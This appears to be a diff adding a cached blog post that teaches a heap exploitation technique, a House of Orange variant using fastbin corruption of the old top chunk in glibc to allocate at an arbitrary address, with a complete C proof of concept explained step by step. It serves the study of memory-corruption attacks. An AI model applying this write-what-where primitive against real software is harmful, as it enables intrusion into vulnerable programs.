@@ -1,0 +1,96 @@
+I"�+<p>This post will demonstrate an alternate way to exploit the House of Orange scenario which was originally shown by 4ngelboy. It involves using fastbin corruption on the old top chunk to allocate a chunk at an arbitrary location, thus achieving a write-what-where primitive.  The premises are same as that of House of Orange –</p>
+
+<ul>
+  <li>A heap overflow must be present.</li>
+  <li>We must control the size that is being passed to malloc.</li>
+</ul>
+
+<p>The advantages of this alternative are –</p>
+
+<ul>
+  <li>Given that the address of the target location is known, no other heap or libc leaks are required.</li>
+  <li>It does not use the _IO_FILE jump table. So the patch with the latest libc, on the vtable check does not apply here.</li>
+</ul>
+
+<p>The proof of concept that this post will be following can be found <a target="_blank" rel="noopener noreferrer" href="https://www.github.com/vigneshsrao/Concepts/blob/master/fastbin_orange/fastbin_orange.c">here</a>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">target</span><span class="o">=</span><span class="mh">0x51</span><span class="p">;</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"target @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">target</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mh">0x70</span><span class="p">);</span>
+    <span class="kt">size_t</span> <span class="o">*</span><span class="n">top</span><span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">p</span><span class="o">+</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mh">0x70</span><span class="p">);</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"top chunk @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">top</span><span class="p">);</span>
+
+    <span class="n">top</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="mh">0x71</span><span class="p">;</span>
+
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+
+    <span class="n">top</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="kt">size_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">target</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">16</span><span class="p">);</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"new chunk @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">16</span><span class="p">));</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>We start with the assumption that the target location is known. This can be a GOT address, malloc_hook, free_hook, a stack location etc. We will take the target location as a stack variable. Also, for this particular PoC, we will be allocating a chunk of size 0x50, but in general, a chunk of any size in the fastbin range can be allocated. Since we will finally be performing a fastbin dup, we need that the size of the chunk is written near our target location.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">target</span><span class="o">=</span><span class="mh">0x51</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The first part is similar to the House of Orange. We first allocate a large chunk, edit the size of the top chunk and then allocate another large chunk whose size should be greater than that of the current top chunk. Note that the top chunk must always satisfy the following conditions –</p>
+
+<p>Top chunk’s PREV_IN_USE bit must be set
+Top chunk + size should be page aligned
+The normal page size on Linux is 4kB (0x1000 bytes). Also, whenever a chunk is allocated, it has 16 bytes of metadata. So we must malloc (0x1000 – 16 – 0x70) bytes. We will come to why it’s “- 0x70” and not “- 0x50” shortly.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>    <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mh">0x70</span><span class="p">);</span>
+
+    <span class="kt">size_t</span> <span class="o">*</span><span class="n">top</span><span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">p</span><span class="o">+</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mh">0x70</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now we have to edit the size of the top chunk. Here, we assume that there is a heap overflow which can be used to do this. We will overwrite the size field of the top chunk with 0x71. Thus the PREV_IN_USE bit is set, and top chunk + size(0x70) is page aligned.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>    <span class="n">top</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="mh">0x71</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now we will come to why we were using the size 0x70, instead of 0x50. When the next call to malloc is made with a size greater than the size of the top chunk, the current top will be extended and the. A temporary chunk is used to keep track of the change in the size of the top chunk. For the temporary chunk, 0x20 byte’s are allocated from the top chunk. Thus after the allocation of the temporary chunk, the size of top chunk becomes 0x70-0x20=0x50 and the top chunk is freed. Thus the fastbin of size 0x50 contains the old top chunk.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now, this scenario can be exploited using a simple fastbin dup as we have a heap overflow. For this, we will first set the next pointer of the fastbin list of size 0x50 to point to the target address. Note that the target address should be such that, 0x51 must be written at the address + 8.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>    <span class="n">top</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="kt">size_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">target</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now, a malloc of size 0x50-16 will return the old top chunk and set the head of the fastbin of size 0x50 to our target chunk.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">16</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The next malloc request of size 0x50-16 will return us a chunk at our target location.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="err">“</span><span class="n">new</span> <span class="n">chunk</span> <span class="err">@</span> <span class="o">%</span><span class="n">p</span><span class="err">\</span><span class="n">n</span><span class="err">”</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">16</span><span class="p">));</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p class="image-pull-left"><img src="/assets/img/fastbin/fastbin_orange.png" alt="fastbin" /></p>
+
+<h2 id="credits">Credits:</h2>
+
+<ul>
+  <li><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html">Angelboy’s blog post</a> on House of Orange.</li>
+  <li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c">House of Orange PoC</a> in Shellphish’s <a href="https://github.com/shellphish/how2heap">how2heap</a> repository.</li>
+</ul>
+:ET
